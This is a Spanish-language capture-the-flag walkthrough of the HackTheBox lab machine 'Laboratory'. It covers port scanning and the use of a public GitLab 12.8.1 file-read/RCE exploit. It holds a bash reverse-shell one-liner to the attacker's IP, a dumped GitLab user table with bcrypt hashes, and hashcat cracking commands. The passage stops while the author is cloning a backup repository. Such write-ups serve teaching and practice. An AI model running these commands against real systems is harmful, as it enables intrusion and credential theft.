---
layout      : post
title       : "HackTheBox - Laboratory"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298banner.png
category    : [ htb ]
tags        : [ gitlab, backup, git, SUID, path-hijacking ]
---
Máquina Linux nivel fácil. Tendremos al lobo naranja (GitLab) :P como punto de entrada, jugaremos con Backups y archivos **.bundle**, obtendremos las llaves de la casa y nos haremos dueños de la r(oo)ta mediante un PATH Hijacking.

![298laboratoryHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298laboratoryHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [0xc45](https://www.hackthebox.eu/profile/73268).

Wenas :3 Nos enfrentaremos al gestor de versiones `GitLab`, usaremos ayuda :O (`/help`) para centrar la búsqueda en la versión del software (**Gitlab 12.8.1**). Jugaremos con un exploit que nos permite ver archivos del sistema pero también obtener una Shell (feita) como el usuario **git** en el hostname `git.laboratory.htb`.

Enumerando y buscando auxilio, usaremos `gitlab-backup` para obtener un `backup` de dos repositorios. Usaremos archivos `.bundle` para generar un `clone` de cada repo. En uno nos encontraremos cosas personales :O, usaremos la llave privada **id_rsa** para migrar al usuario **dexter**.

Buscando archivos relacionados con **dexter** encontramos un `SUID` llamativo, jugando con `cat` y `ltrace` vemos que está llamando al binario `chmod` sin ruta absoluta. Aprovecharemos esto para generar un `PATH Hijacking` donde al ejecutar el archivo interesante, obtengamos una Shell como el usuario **root**.

#### Clasificación de la máquina.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Bastante RealG4Life. A darleeeeeeeeee.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto).

...

Tendremos como siempre 3 fases:

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.

```bash
–» nmap -p- --open -v 10.10.10.216 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Thu Jan 28 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.216
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.216 ()   Status: Up
Host: 10.10.10.216 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///        Ignored State: filtered (65532)
# Nmap done at Thu Jan 28 25:25:25 2021 -- 1 IP address (1 host up) scanned in 396.96 seconds
```

Muy bien, tenemos los siguientes servicios:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | [SSH](https://es.wikipedia.org/wiki/Secure_Shell) |
| 80     | [HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto) |
| 443    | [HTTPS (TLS)](https://sectigostore.com/blog/port-443-everything-you-need-to-know-about-https-443/) |

Hagamos nuestro escaneo de versiones y scripts con base en cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 22,80,443 -sC -sV 10.10.10.216 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Thu Jan 28 25:25:25 2021 as: nmap -p 22,80,443 -sC -sV -oN portScan 10.10.10.216
Nmap scan report for 10.10.10.216
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 28 25:25:25 2021 -- 1 IP address (1 host up) scanned in 32.26 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu |
| 80     | HTTP     | Apache httpd 2.4.41  |
| 443    | HTTPS    | Apache httpd 2.4.41  |

Vemos cositas:

* Hace una redirección al dominio `laboratory.htb` pero al del puerto `443`.
* También al parecer tenemos otro dominio: `git.laboratory.htb`.

Empecemos a enumerar cada servicio :)

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

Efectivamente nos redirecciona al dominio `laboratory.htb`, lo agregamos al archivo `/etc/hosts` para corregir la resolución:

* Info sobre el archivo `/etc/hosts`. - [e-logicasoftware.com](http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html)

```bash
–» cat /etc/hosts
...
10.10.10.216  laboratory.htb git.laboratory.htb
...
```

Y ahora volvemos a probar:

![298page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298page80.png)

Perfecto, veamos que podemos obtener de ahí...

Me pareció interesante y algo críptico este apartado, así que mejor guardarlo:

![298page80_ourCustomers](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298page80_ourCustomers.png)

Pero de resto no tenemos algo interesante... Recordemos el otro dominio que vimos en el escaneo (`git.laboratory.htb`), vamos allí a ver sí si funciona:

![298page80_git_domain](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298page80_git_domain.png)

Nice, tenemos `GitLab` activo, con la posibilidad de crearnos una cuenta e ingresar, hagámoslo y veamos que hay dentro...

Pero al momento de intentar registrarnos con el correo `lanz@lanz.com` (y otros diferentes) obtenemos este error:

```html
1 error prohibited this user from being saved:

    Email domain is not authorized for sign-up
```

Acá ya me iba a empezar a complicar, pero recordé... y si probamos con el dominio `laboratory.htb`? Osea `lanz@laboratory.htb`:

![298page80_git_dashboard](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298page80_git_dashboard.png)

Pos sí, logramos entrar, démosle una vuelta a la página...

En `/help` vemos la versión:

![298page80_git_version](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298page80_git_version.png)

**Acá tuve algo de suerte**, hace poco había estado jugando con el exploit que vamos a usar:

Buscando en la web sobre esa versión y sus posibles exploits, nos encontramos este script que se aprovecha de una vulnerabilidad combinando dos vectores de ataque para ya sea, obtener información de los archivos dentro del sistema ([Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)) o ejecutar comandos en el sistema (RCE).

Todo el proceso se logra gracias al ([Path Traversal]()), ya que extrae la `secret_key_base` usada por `Rails`. Para posteriormente obtener ejecución de comandos explotando una deserialización de una cookie llamada: `experimentation_subject_id`.

* Descripción de la vulnerabilidad. - [rapid7.com/gitlab_file_read_rce](https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/).
* Exploit que usaremos creado por `dotPY-hax`. - [github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE)

Si revisamos el código, solo debemos cambiar: el puerto al cual queremos que se genere la reverse Shell y el dominio con el que creara la cuenta:

![298bash_exploit_reviewcode](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298bash_exploit_reviewcode.png)

Ejecutemos:

```bash
–» python3 gitlab_rce.py
usage: gitlab_rce.py <http://gitlab:port> <local-ip>

–» python3 gitlab_rce.py https://git.laboratory.htb 10.10.14.159
...
```

![298bash_exploit_running_choose](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298bash_exploit_running_choose.png)

Elejimos la `opcion 2` y nos indica esto:

```bash
Start a listener on port 4433 and hit enter (nc -vlnp 4433)
```

Nos ponemos en escucha:

```bash
–» nc -lvp 4433
```

Y damos `enter`:

![298bash_exploit_running_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298bash_exploit_running_done.png)

Perfecto, tamos dentro de la máquina, ahora a enumerar. Pero primero hagámosle un tratamiento a nuestra Shell para que sea completamente interactiva, ya que si por alguna razón queremos ver los comandos anteriores o hacer `CTRL + C` no podremos:

* S4vitar nos explica lo que debemos hacer para conseguir una [Shell completamente interactiva (tratamiento de la TTY)](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

Pero al intentarlo (o pues a mí me paso) la Shell (de `ruby` como indicaba el exploit: **"!!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP"**) queda estática y no hace nada :( Así que probemos a generarnos una nueva pero en este caso ya con `bash`:

Primero nos volvemos a poner en escucha, pero ahora en otro puerto, en mi caso el `4434` y ejecutamos en la Shell de `git`:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.159/4434 0>&1'
```

```bash
–» nc -lvp 4434
listening on [any] 4434 ...
connect to [10.10.14.159] from laboratory.htb [10.10.10.216] 36932
bash: cannot set terminal process group (398): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ id
id
uid=998(git) gid=998(git) groups=998(git)
git@git:~/gitlab-rails/working$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
git@git:~/gitlab-rails/working$ id
id
uid=998(git) gid=998(git) groups=998(git)
git@git:~/gitlab-rails/working$
```

Perfecto, ahora si procedemos a hacer el tratamiento de la TTY y a enumerar...

Después de buscar y buscar por todos lados me perdí y no sabía que más hacer, subí `linpeas`, enumere servicios mediante `ps auxwww` y con el archivo `/proc/net/tcp` (que tiene los números de los puertos donde hay algún servicio corriendo). Revise archivos locos por X parte, di vueltas por la mayoría de carpetas y con `grep` no encontraba nada... Así que busque ayuda con el siempre fiable [@TazWake](https://www.hackthebox.eu/profile/49335), usuario de la plataforma, moderador y persona superpresta a ayudar, que con una sola frase: 

> "Have you tried `gitlab-backup`?"

Me soluciono el dilema y además entendí que no, no había intentado esa herramienta :(

Si la usamos en pocos segundos obtenemos un archivo `.tar` con el backup del repositorio, si nos creamos una carpeta en `/dev/shm` (archivos temporales) llamada `test/` donde podamos extraer toda la data sin molestar a nadie, tenemos:

```bash
git@git:/dev/shm/test$ gitlab-backup 
2021-01-29 22:45:49 +0000 -- Dumping database ... 
Dumping PostgreSQL database gitlabhq_production ... [DONE]
2021-01-29 22:45:51 +0000 -- done
2021-01-29 22:45:51 +0000 -- Dumping repositories ...
 * dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) ... [DONE]
[SKIPPED] Wiki
 * dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) ... [DONE]
[SKIPPED] Wiki
2021-01-29 22:45:53 +0000 -- done
2021-01-29 22:45:53 +0000 -- Dumping uploads ... 
2021-01-29 22:45:53 +0000 -- done
2021-01-29 22:45:53 +0000 -- Dumping builds ... 
2021-01-29 22:45:53 +0000 -- done
2021-01-29 22:45:53 +0000 -- Dumping artifacts ... 
2021-01-29 22:45:53 +0000 -- done
2021-01-29 22:45:53 +0000 -- Dumping pages ... 
2021-01-29 22:45:53 +0000 -- done
2021-01-29 22:45:53 +0000 -- Dumping lfs objects ... 
2021-01-29 22:45:53 +0000 -- done
2021-01-29 22:45:53 +0000 -- Dumping container registry images ... 
2021-01-29 22:45:53 +0000 -- [DISABLED]
Creating backup archive: 1612133153_2021_01_29_12.8.1_gitlab_backup.tar ... done
Uploading backup archive to remote storage  ... skipped
Deleting tmp directories ... done
done
done
done
done
done
done
done
Deleting old backups ... skipping
Warning: Your gitlab.rb and gitlab-secrets.json files contain sensitive data 
and are not included in this backup. You will need these files to restore a backup.
Please back them up manually.
Backup task is done.
git@git:/dev/shm/test$
```

Buscamos el archivo para moverlo a nuestra carpeta:

```bash
git@git:/dev/shm/test$ find / -name 1611956382_2021_01_29_12.8.1_gitlab_backup.tar 2>/dev/null
/var/opt/gitlab/backups/1611956382_2021_01_29_12.8.1_gitlab_backup.tar
git@git:/dev/shm/test$ mv /var/opt/gitlab/backups/1611956382_2021_01_29_12.8.1_gitlab_backup.tar .
git@git:/dev/shm/test$ ls
1611956382_2021_01_29_12.8.1_gitlab_backup.tar
git@git:/dev/shm/test$ 
```

Lo descomprimimos:

```bash
git@git:/dev/shm/test$ tar -xvf 1611956382_2021_01_29_12.8.1_gitlab_backup.tar #e(x)traemos y (v)emos por pantalla lo que va pasando con el (f)ile.
repositories/              
repositories/@hashed/
...
...
db/
db/database.sql.gz
uploads.tar.gz
builds.tar.gz
artifacts.tar.gz
pages.tar.gz
lfs.tar.gz
backup_information.yml
git@git:/dev/shm/test$ 
```

Perfecto, nos llama la atención el archivo `database.sql.gz`, procedamos a descomprimirlo también:

#### ▿ Rabbit hole :P

```bash
git@git:/dev/shm/test/db$ ls
database.sql.gz
git@git:/dev/shm/test/db$ gzip -d database.sql.gz 
git@git:/dev/shm/test/db$ ls
database.sql
git@git:/dev/shm/test/db$ 
```

Tiene un montón de información, después de jugar un poco, intente buscar mi usuario creado en `GitLab` al inicio de la máquina:

```bash
git@git:/dev/shm/test/db$ grep -i "lanz" database.sql 
43      lanz    lanz    43      2021-01-29 18:48:12.104345      2021-01-29 18:48:12.104345      \N              \N      f       f       20      t       ready   \N      \N      \N      \N     \N       \N      \N      \N      f       48      1179648 \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      1       \N      \N      \N      \N
101     43      Namespace       lanz    2021-01-29 18:48:12.109994      2021-01-29 18:48:12.109994      lanz
43      lanz@laboratory.htb     $2a$10$d1iFT3BRnuqkzprchrPof.9Mv.DCjqPxziHowFhSfP7bFg6.HzYHu    \N      \N      \N      1       2021-01-29 18:48:12.120568      2021-01-29 18:48:12.120568     172.17.0.1       172.17.0.1      2021-01-29 18:48:12.096365      2021-01-29 18:48:12.858875      lanz    f       10                              \N      0       \N      lanz    t       f      active   1       \N      \N      \N      \N      \N      2021-01-29 18:48:11.977481      \N      \N      f               \N      lanz@laboratory.htb     f       f       \N      \N      \N     \N       f       \N              0       2       \N      0       f       \N      \N      \N      f       1jwc9nbz418ndij73kh3hw7u8       \N      f       f       48      \N      2021-01-29     fen      \N      \N      \N      \N      1       \N      RJMyoUczVKQogLZxez-G    f       \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
git@git:/dev/shm/test/db$ 
```

Perfecto, vemos el correo y además un `hash`... Pero pues el mío no interesa, veamos si podemos obtener más usuarios apoyándonos de las opciones `-A` (After) y `-B` (Before), para listar lineas antes y después de nuestra búsqueda:

```bash
git@git:/dev/shm/test/db$ grep -i "lanz@" -B 3 -A 3 database.sql 
30      test123@laboratory.htb  $2a$10$i2s70e/JnuB7PZgwsIKXq.adqFoTmlY4fYPyrpn3.fe6J5seXqJYq    \N      \N      \N      1       2021-01-29 14:34:05.460662      2021-01-29 14:34:05.460662     172.17.0.1       172.17.0.1      2021-01-29 14:34:05.445185      2021-01-29 14:34:05.775697      test    f       10                              \N      0       \N      test123 t       f      active   1       \N      \N      \N      \N      \N      2021-01-29 14:34:05.344875      \N      \N      f               \N      test123@laboratory.htb  f       f       \N      \N      \N     \N       f       \N              0       2       \N      0       f       \N      \N      \N      f       ak3v7vhrg4ncr5fydb5sidjro       \N      f       f       48      \N      2021-01-29     fen      \N      \N      \N      \N      1       \N      qKbE4G2UQ9mCEgaWYM2m    f       \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
1       admin@example.com       $2a$10$.9fAYoRs9/Erjs0FH.OlN.OH.L4cj2at6RfTmIQ3CTEl2D4ylgJ6i    \N      \N      \N      9       2021-01-29 19:26:03.945205      2020-10-20 18:39:24.13278      172.17.0.1       172.17.0.1      2020-07-02 18:02:18.859553      2021-01-29 19:26:03.976187      Dexter McPherson        t       100000                                  0       \N      dexter tf       active  1       \N      \N      \N      avatar.png      6nEdboVbdcGyZmgaJ-ym    2020-07-02 18:02:18.623133      2020-07-02 18:37:11.372854      dexter@laboratory.htb   f              \N       admin@example.com       f       f               \N      \N      \N      f       \N              0       2       \N      0       f       \N      \N      \N      f       bonf6hqghs7dp26rjj6f3w2w4               f       f       48      \N      2021-01-29      f       en      \N      \N      \N      \N      1       \N      RvtN2a2xGmyx2-fFL4T4    f       \N      f       \N     \N       \N      \N      \N      \N      \N      3
42      exp101t@laboratory.htb  $2a$10$ICZBhypCVivQKB0n8YIxNuGr/YYMa4A9zGtOM0seJflZ7jiVCHfKG    \N      \N      \N      1       2021-01-29 18:47:30.823162      2021-01-29 18:47:30.823162     172.17.0.1       172.17.0.1      2021-01-29 18:47:30.785264      2021-01-29 19:15:46.002469      exp101t f       10                              \N      0       \N      exp101t t       f      active   1       \N      \N      \N      \N      \N      2021-01-29 18:47:30.66866       \N      \N      f               \N      exp101t@laboratory.htb  f       f       \N      \N      \N     \N       f       \N              0       2       \N      0       f       \N      \N      \N      f       c30j1n6akc41gq3xnlbh3jxmp       \N      f       f       48      \N      2021-01-29     fen      \N      \N      \N      \N      1       \N      5f1AHFrApfeU4CqRs57H    f       \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
43      lanz@laboratory.htb     $2a$10$d1iFT3BRnuqkzprchrPof.9Mv.DCjqPxziHowFhSfP7bFg6.HzYHu    \N      \N      \N      1       2021-01-29 18:48:12.120568      2021-01-29 18:48:12.120568     172.17.0.1       172.17.0.1      2021-01-29 18:48:12.096365      2021-01-29 18:48:12.858875      lanz    f       10                              \N      0       \N      lanz    t       f      active   1       \N      \N      \N      \N      \N      2021-01-29 18:48:11.977481      \N      \N      f               \N      lanz@laboratory.htb     f       f       \N      \N      \N     \N       f       \N              0       2       \N      0       f       \N      \N      \N      f       1jwc9nbz418ndij73kh3hw7u8       \N      f       f       48      \N      2021-01-29     fen      \N      \N      \N      \N      1       \N      RJMyoUczVKQogLZxez-G    f       \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
4       seven@laboratory.htb    $2a$10$HkBO3A4k6G42X85r0ZIpO.RlSLCg9igEaiiU8r44Ymd7e2nWcjixC    \N      \N      \N      3       2020-09-05 19:01:10.34461       2020-07-17 19:03:51.88634      172.17.0.1       172.17.0.1      2020-07-17 15:57:57.446229      2020-09-05 19:01:10.459181      Seven   f       100000                                  0       \N      seven   t       f      active   1       \N      \N      \N      avatar.png      \N      2020-07-17 15:57:57.260823      \N      \N      f               \N      seven@laboratory.htb    f       f               \N     \N       \N      f       \N              0       2       \N      0       f       \N      \N      \N      f       bvm8qb1ou3vg35u3tchcfzgp1               f       f       48      \N      2020-09-05      f       en      \N      \N      \N      \N      1       \N      2sHXWyKj3rwag36sVeP-    f       \N      f       seven@laboratory.htb    \N      \N      \N      \N      \N      \N     4
3       ghost@example.com               \N      \N      \N      0       \N      \N      \N      \N      2020-07-02 19:52:08.183475      2020-07-02 19:52:08.183475      Ghost User      f      100000                           This is a "Ghost User", created to hold all issues authored by users that have since been deleted. This user cannot be removed. 0       \N      ghost   t      factive  1       \N      \N      \N      \N      tzyprXQ5VMAHsEjuex6L    \N      2020-07-02 19:52:08.184131      \N      f               \N      \N      f       f       \N      \N      \N     \N       f       \N              0       2       \N      0       f       \N      \N      \N      f       1xvejv7i8oe8wluh6jtgeimge       \N      f       f       48      t       \N      f      en       \N      \N      \N      \N      1       \N      \N      f       \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
5       u@laboratory.htb        $2a$10$sXPLtsEKOUD.xg5WOj3B6.zuWNhVj/rYt4B2z0yAxYDkgswbJHJIW    \N      \N      \N      1       2021-01-29 07:09:51.640403      2021-01-29 07:09:51.640403     172.17.0.1       172.17.0.1      2021-01-29 07:09:51.603953      2021-01-29 07:09:52.168008      normann f       10                              \N      0       \N      normann t       f      active   1       \N      \N      \N      \N      \N      2021-01-29 07:09:51.42427       \N      \N      f               \N      u@laboratory.htb        f       f       \N      \N      \N     \N       f       \N              0       2       \N      0       f       \N      \N      \N      f       5oi076s0mnm5bhutjonx9tyqv       \N      f       f       48      \N      2021-01-29     fen      \N      \N      \N      \N      1       \N      Zsn5bxeDhqK47W89HrB7    f       \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
git@git:/dev/shm/test/db$ 
```

Es mucho texto y puede verse confuso, lo sé, pero podemos destacar la fecha de creación de los usuarios, si nos guiamos por eso, tenemos 3 interesantes:

```html
| username@correo      | Nombre           | Hash                                                         | Fecha creación |
| -------------------- | :--------------- |:------------------------------------------------------------ | :------------- |
| admin@example.com    | Dexter McPherson | $2a$10$.9fAYoRs9/Erjs0FH.OlN.OH.L4cj2at6RfTmIQ3CTEl2D4ylgJ6i | 2020-07-02     |
| seven@laboratory.htb | Seven            | $2a$10$HkBO3A4k6G42X85r0ZIpO.RlSLCg9igEaiiU8r44Ymd7e2nWcjixC | 2020-07-17     |
| ghost@example.com    | ghost            | -                                                            | 2020-07-02     | 
```

Perfeeecto, pues enfoquemosnos en esos hashes y veamos si los podemos crackear...

Apoyado de [todos los ejemplos de hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) que tiene [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) en su wiki, encontramos que son tipo `bcrypt $2*$, Blowfish (Unix)`:

![298page_example_hashcat_bcrypt](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298page_example_hashcat_bcrypt.png)

Guardamos los hashes en un archivo y procedemos, usare `hashcat`:

```bash
–» hashcat -m 3200 -a 0 hashes_t /usr/share/wordlists/rockyou.txt -o cracked_bro
```

* `-m`: Tipo de hash.
* `-a`: Le indicamos que haga un ataque en modo diccionario.
* `hashes_t`: Archivo con los hash.
* `./rockyou.txt`: Diccionario que usaremos.
* `-o`: La salida la guarda en el archivo **cracked_bro**.

Pero nada, no lo logramos... Así que de nuevo, estaba full estancado y pedí ayuda: La ayuda me indico que fuera cauteloso con los archivos del `.tar` y que además me fijara en el output del proceso... (Que lo puse arriba y ni me había fijado):

```bash
...
 * dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) ... [DONE]
[SKIPPED] Wiki
 * dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) ... [DONE]
[SKIPPED] Wiki
...
```

Donde tenemos dos proyectos:

* `securewebsite`.
* `securedocker`.

Y tenemos una ruta para cada uno, inspeccionemos su contenido:

```bash
git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ ls -la
total 0
drwxr-xr-x 2 git git 40 Jan 31 22:45 .
drwxr-xr-x 3 git git 80 Jan 31 22:45 ..
git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ cd ..
git@git:/dev/shm/test/repositories/@hashed/2c/62$ ls -la
total 7388
drwxr-xr-x 3 git git      80 Jan 31 22:45 .
drwxr-xr-x 3 git git      60 Jan 31 22:45 ..
drwxr-xr-x 2 git git      40 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3
-rw-r--r-- 1 git git 7563905 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.bundle
git@git:/dev/shm/test/repositories/@hashed/2c/62$
```

No tiene ningún contenido la carpeta, pero una atrás contiene un archivo `.bundle`... Después de otra vez estar perdido, buscando por internet nos damos cuenta de una genialidad con los archivos `.bundle`:

> .. you want a single file that has your whole project and all the commits you’ve made. You can use `git bundle` for this! [blog.tplus1/git-bundle](https://blog.tplus1.com/blog/2018/12/11/git-bundle-converts-your-whole-repository-into-a-single-file-kind-of-like-webpack/).

Esto está muy loco porque significa que todo nuestro repositorio, commits, logs, etc. Lo podemos guardar en un único archivo, que en el caso ya de querer volver a ver los archivos, logs, commits del repositorio, lo único que debemos hacer es un `git clone` al `.bundle`:

> ```sh
> $ git clone -b master /tmp/myproject.bundle myproject2
> $ cd myproject2
> ```
>> [blog.tplus1/git-bundle](https://blog.tplus1.com/blog/2018/12/11/git-bundle-converts-your-whole-repository-into-a-single-file-kind-of-like-webpack/).

Pues apoyados en esto, probemos a generar los dos repositorios y ver que podemos encontrar útil:

#### ¬ securewebsite

```
* dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) ... [DONE]
```

```bash
git@git:/dev/shm/test/repositories/@hashed/2c/62$ ls -la
total 7388
drwxr-xr-x 3 git git      80 Jan 31 22:45 .
drwxr-xr-x 3 git git      60 Jan 31 22:45 ..
drwxr-xr-x 2 git git      40 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3
-rw-r--r-- 1 git git 7563905 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.bundle
git@git:/dev/shm/test/repositories/@hashed/2c/62$ git clone 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.bundle 
Cloning into '2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3'...
Receiving objects: 100% (66/66), 7.21 MiB | 78.58 MiB/s, done.
Resolving deltas: 100% (5/5), done.
git@git:/dev/shm/test/repositories/@hashed/2c/62$ ls -la
total 7388
drwxr-xr-x 3 git git      80 Jan 31 22:45 .
drwxr-xr-x 3 git git      60 Jan 31 22:45 ..
drwxr-xr-x 5 git git     140 Jan 31 23:10 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3
-rw-r--r-- 1 git git 7563905 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.bundle

git@git:/dev/shm/test/repositories/@hashed/2c/62$ cd 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3
git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ ls -la
total 12
drwxr-xr-x 5 git git  140 Jan 31 23:10 .
drwxr-xr-x 3 git git   80 Jan 31 22:45 ..
drwxr-xr-x 7 git git  240 Jan 31 23:10 .git
-rw-r--r-- 1 git git  430 Jan 31 23:10 CREDITS.txt
drwxr-xr-x 6 git git  120 Jan 31 23:10 assets
drwxr-xr-x 2 git git  180 Jan 31 23:10 images
-rw-r--r-- 1 git git 7045 Jan 31 23:10 index.html
```

```git
git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ git log
error: cannot run less: No such file or directory
commit 5bd1925e5f8ce5ab97c5eef8a1c2cac3c778873f (HEAD -> master, origin/master, origin/HEAD)
Author: Dexter McPherson <dexter@laboratory.htb>
Date:   Sun Jul 5 17:11:26 2020 +0200

    Initial commit
```

Bien, pues despues de ojear los archivos no tenemos nada relevante, solo confirmamos el correo de `dexter` :P

#### ¬ securedocker

```
* dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) ... [DONE]
```

```bash
git@git:/dev/shm/test/repositories/@hashed/19/58$ ls -la
total 4
drwxr-xr-x 3 git git   80 Jan 31 22:45 .
drwxr-xr-x 3 git git   60 Jan 31 22:45 ..
drwxr-xr-x 2 git git   40 Jan 31 23:09 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7
-rw-r--r-- 1 git git 3542 Jan 31 22:45 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.bundle
git@git:/dev/shm/test/repositories/@hashed/19/58$ git clone 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.bundle 
Cloning into '19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7'...
Receiving objects: 100% (10/10), done.
git@git:/dev/shm/test/repositories/@hashed/19/58$ ls -la
total 4
drwxr-xr-x 3 git git   80 Jan 31 22:45 .
drwxr-xr-x 3 git git   60 Jan 31 22:45 ..
drwxr-xr-x 4 git git  120 Jan 31 23:09 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7
-rw-r--r-- 1 git git 3542 Jan 31 22:45 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.bundle

git@git:/dev/shm/test/repositories/@hashed/19/58$ cd 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7
